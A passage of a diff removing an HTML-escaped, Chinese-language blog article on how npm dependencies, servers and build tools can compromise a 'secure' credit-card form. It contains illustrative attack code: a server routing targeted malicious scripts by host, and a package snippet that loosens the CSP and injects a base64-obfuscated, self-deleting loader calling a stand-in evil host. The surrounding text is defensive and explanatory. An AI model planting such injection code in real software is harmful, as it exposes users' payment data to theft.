-    &lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sendFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;__dirname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'../malicious-code/targeted/corporate-bank.js'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
-  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'host'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;includes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'government-secrets.com'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sendFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;__dirname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'../malicious-code/targeted/government-secrets.js'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
-  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'host'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;includes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'that-chat-app.com'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sendFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;__dirname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'../malicious-code/targeted/that-chat-app.js'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
-  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sendFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;__dirname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'../malicious-code/generic.js'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
-  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;在攻擊者的伺服器上&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;攻擊者可以自由更新並在閒暇時添加他們的針對性代碼。&lt;/p&gt;
-
-&lt;p&gt;你真的&lt;strong&gt;必須&lt;/strong&gt;建好自己的CSP。&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;p&gt;好吧，這是很粗糙的說法：使用&lt;code class=&quot;highlighter-rouge&quot;&gt;postMessage&lt;/code&gt;發送敏感數據從一個iframe到父頁面只會稍微增加您的風險。&lt;strong&gt;通用&lt;/strong&gt;惡意代碼顯然不太可能會截到這一點。而無論您做什麼，&lt;strong&gt;有針對性&lt;/strong&gt;的代碼都會獲取用戶的信用卡數據。&lt;/p&gt;
-
-&lt;p&gt;（根據記錄，我不會在自己的小網站上使用選項1,2或3，我會讓專業人員處理我的信用卡數據，只提供Google / Facebook / Twitter登錄。你當然可以不要遵循這個建議，如果你的用戶不會註冊社交網站的成本大過你必須安全地獲取和存儲密碼的成本/風險。&lt;/p&gt;
-
-&lt;h3 id=&quot;其他點的脆弱性&quot;&gt;其他點的脆弱性&lt;/h3&gt;
-
-&lt;p&gt;你可能會認為，只要你按照上面的建議做，你就會是安全健康的。其實不然。我想到還有四個地方可能會遇到麻煩，我發誓要用社群的智慧來保持下面這些更新。&lt;/p&gt;
-
-&lt;h4 id=&quot;1在伺服器上&quot;&gt;1.在伺服器上&lt;/h4&gt;
-
-&lt;p&gt;我現在有一個超輕量級的HTML文件，準備用來擷取用戶的輸入而不被偷取。我只需要把它放置在某個地方，以便它可以從一個單獨的網域中提供服務。&lt;/p&gt;
-
-&lt;p&gt;也許我會在某處啟動一個簡單的Node伺服器。我只是添加&lt;strong&gt;一個&lt;/strong&gt;小log包…&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://cdn-images-1.medium.com/max/800/1*rGWHJtLE1KnGLfYJMVP3Wg.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;哦，來吧。204包是吧？&lt;/p&gt;
-
-&lt;p&gt;好的，204是很多，但是你可能想知道在只服務於文件的伺服器上運行的程式碼是如何危害到在瀏覽器中所輸入的用戶數據的？&lt;/p&gt;
-
-&lt;p&gt;那麼，問題就是任何npm包中的任何程式碼都可以在你的伺服器上執行，包括處理網路流量的程式碼。&lt;/p&gt;
-
-&lt;p&gt;現在，我只是一個惡意開發者，我很容易被四個字母的單詞混淆像&lt;code class=&quot;highlighter-rouge&quot;&gt;this&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;call&lt;/code&gt;，但即使我可以完成將一個腳本注入outbound response，並允許它透過編輯CSP來訪問我的邪惡網域。&lt;/p&gt;
-
-&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fs&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'fs'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;express&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'express'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-
-&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;indexHtml&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;originalResponseSendFile&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;express&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sendFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-
-&lt;span class=&quot;nx&quot;&gt;express&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sendFile&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;callback&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;endsWith&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'index.html'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;c1&quot;&gt;// add my domain to the content security policy&lt;/span&gt;
-    &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;csp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;express&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Content-Security-Policy'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;nx&quot;&gt;csp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;csp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'connect-src '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'connect-src https://adxs-network-live.com '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-
-    &lt;span class=&quot;nx&quot;&gt;express&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Content-Security-Policy'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;csp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-
-    &lt;span class=&quot;c1&quot;&gt;// inject a cheeky little self-destructing script&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;indexHtml&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-      &lt;span class=&quot;nx&quot;&gt;indexHtml&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;readFileSync&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'utf8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-
-      &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;`
-        &amp;lt;script&amp;gt;
-          var googleAuthToken = document.createElement('script');
-          googleAuthToken.textContent = atob('CiAgICAgICAgY29uc3Qgc2NyaXB0RWwgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTsKICAgICAgICBzY3JpcHRFbC5zcmMgPSAnaHR0cHM6Ly9ldmlsLWFkLW5ldHdvcms/YWRfdHlwZT1tZWRpdW0nOwogICAgICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoc2NyaXB0RWwpOwogICAgICAgIHNjcmlwdEVsLnJlbW92ZSgpOyAvLyByZW1vdmUgdGhlIHNjcmlwdCB0aGF0IGZldGNoZXMKICAgICAgICBkb2N1bWVudC5zY3JpcHRzW2RvY3VtZW50LnNjcmlwdHMubGVuZ3RoIC0gMV0ucmVtb3ZlKCk7IC8vIHJlbW92ZSB0aGlzIHNjcmlwdAogICAgICAgIGRvY3VtZW50LnNjcmlwdHNbZG9jdW1lbnQuc2NyaXB0cy5sZW5ndGggLSAxXS5yZW1vdmUoKTsgLy8gYW5kIHRoZSBvbmUgdGhhdCBjcmVhdGVkIGl0CiAgICA=');
-          document.body.appendChild(googleAuthToken);
-        &amp;lt;/script&amp;gt;
-      `&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-
-      &lt;span class=&quot;nx&quot;&gt;indexHtml&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;indexHtml&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'&amp;lt;/body&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;lt;/body&amp;gt;`&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-
-    &lt;span class=&quot;nx&quot;&gt;express&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;indexHtml&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;nx&quot;&gt;originalResponseSendFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;callback&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;什麼是紅色，鯡魚和一個名為“googleAuthToken”的變量？&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;當注入的腳本登陸瀏覽器時，它會從邪惡的伺服器加載一些（可能是有針對性的）惡意的JavaScript（這可能是因為CSP認為這是可以的），然後刪除它自己的所有痕跡。&lt;/p&gt;
-
-&lt;p&gt;上面的要點本身並沒有實際的用處（正如眼睛銳利的讀者都會注意到的那樣），一個真正的駭客不可能會像這樣直白的攻擊。我只是想說明你的伺服務器就是個狂野西部無法地帶，那裡的&lt;strong&gt;任何東西&lt;/strong&gt;都有可能暴露用戶在瀏覽器中輸入的數據。&lt;/p&gt;
-
-&lt;p&gt;（如果你是一個package的作者，你可以考慮使用&lt;code class=&quot;highlighter-rouge&quot;&gt;Object.freeze&lt;/code&gt;或&lt;code class=&quot;highlighter-rouge&quot;&gt;Object.defineProperty&lt;/code&gt;與&lt;code class=&quot;highlighter-rouge&quot;&gt;writable: false&lt;/code&gt;來鎖定你的東西。）&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;p&gt;實際上，可能有點牽強附會，認為有Node模塊明目張膽的做outbound requests確實太扯了 - 對我來說這也太容易被發現了。&lt;/p&gt;
-
-&lt;p&gt;但是，你是否真的想要創建一個不包含任何第三方代碼的表單，但讓第三方代碼能夠在將其發送給用戶之前進行修改？這是屬於你該考量的。&lt;/p&gt;
-
-&lt;p&gt;我的建議是從靜態文件伺服器提供這些“安全”的文件，或不要打斷來做任何這樣的事情。&lt;/p&gt;
-
-&lt;h4 id=&quot;2發送到靜態文件服務器&quot;&gt;2.發送到靜態文件服務器&lt;/h4&gt;
-
-&lt;p&gt;是的，標題即是我們要更進的一步，但也同時是一個漏洞的名稱。&lt;/p&gt;
-
-&lt;p&gt;我是&lt;a href=&quot;https://firebase.google.com/docs/hosting/&quot;&gt;Firebase for static hosting&lt;/a&gt;的忠實粉絲，因為它的速度可以極盡所能的快，而且部署流程簡單的要命。&lt;/p&gt;
-
-&lt;p&gt;只需安裝&lt;code class=&quot;highlighter-rouge&quot;&gt;firebase-tools&lt;/code&gt;從NPM和…哦不，我正在使用NPM來避免使用NPM。&lt;/p&gt;
-
-&lt;p&gt;好吧，深呼吸一下，也許這個正是那些美麗的zero-dependency
-NPM之一。&lt;/p&gt;
-
-&lt;p&gt;正在安裝…安裝…&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://cdn-images-1.medium.com/max/800/1*otIgVW16N9SkaHhOAoX_JA.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;耶穌在上，640包！&lt;/p&gt;
-
-&lt;p&gt;好，我放棄提出建議了，你現在只能靠自己惹。畢竟把你的HTML文件以某種方式放到伺服器這件事上。某個時候，我們都需要信任由陌生人寫的程式碼。&lt;/p&gt;
-
-&lt;p&gt;有趣的事實是：寫這篇文章讓我花了幾個星期。我正在進行最後的草稿，然後我再次安裝了Firebase工具來檢查是否真是640這數字。&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://cdn-images-1.medium.com/max/800/1*6UCNd965XgbqxDhFcMgUUg.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;647，真棒，我想知道這七個新軟體包是做什麼的？我想知道管理Firebase工具的人是否知道這七個新軟體包的作用？我想知道有沒有人知道他們的軟體包需要做什麼？&lt;/p&gt;
-
-&lt;h4 id=&quot;3-webpack&quot;&gt;3. Webpack&lt;/h4&gt;
-
-&lt;p&gt;您可能已經註意到，我沒有建議您將“安全的”HTML文件合併到build pipeline中（例如，共享CSS），儘管這樣可以解決程式碼重複問題。&lt;/p&gt;
-
-&lt;p&gt;這是因為即使是最簡單的Webpack pipeline中涉及的數百個包裹中任何一個都可能會修改building過程的輸出。Webpack自己需要367個包裹。像css-loader這樣的良性可能會增加246個。您可能會使用優秀的html-webpack-plugin來在您的索引文件中放置正確的CSS文件名，這將會在其上添加156個包。&lt;/p&gt;
-
-&lt;p&gt;再一次，我認為其中的任何一個都不太可能將腳本注入到縮小的輸出中。但是，要做出這麼大的努力來製作一個原始的，小的，手寫的，人類可讀的與&lt;strong&gt;倉鼠友好&lt;/strong&gt;的HTML文件，然後在睡覺之前將其與幾百隻杜賓一起上線似乎是錯誤的。&lt;/p&gt;
-
-&lt;h4 id=&quot;4無能的攻擊&quot;&gt;4.無能的攻擊&lt;/h4&gt;
-
-&lt;p&gt;最後一件防範措施所處理的是一些最危險如可以修改你編寫的任何代碼並取消你所提出的任何安全障礙的東西：從現在起開始6個月的新生孩子，你並不知道他們在做什麼。&lt;/p&gt;
-
-&lt;p&gt;這實際上是防止的最棘手的事情。我能想到的唯一的解決方案是“單元測試”，確保這些“安全”文件中沒有外部腳本。&lt;/p&gt;
-
-&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fs&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'fs'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;path&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'path'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;JSDOM&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'jsdom'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-
-&lt;span class=&quot;nx&quot;&gt;it&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'should not contain any external scripts, ask David why'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-  &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;creditCardForm&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;readFileSync&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;resolve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;__dirname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'../public/credit-card-form.html'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'utf8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-
-  &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;dom&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;JSDOM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
-    &lt;span class=&quot;nx&quot;&gt;creditCardForm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;runScripts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'dangerously'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
-  &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-
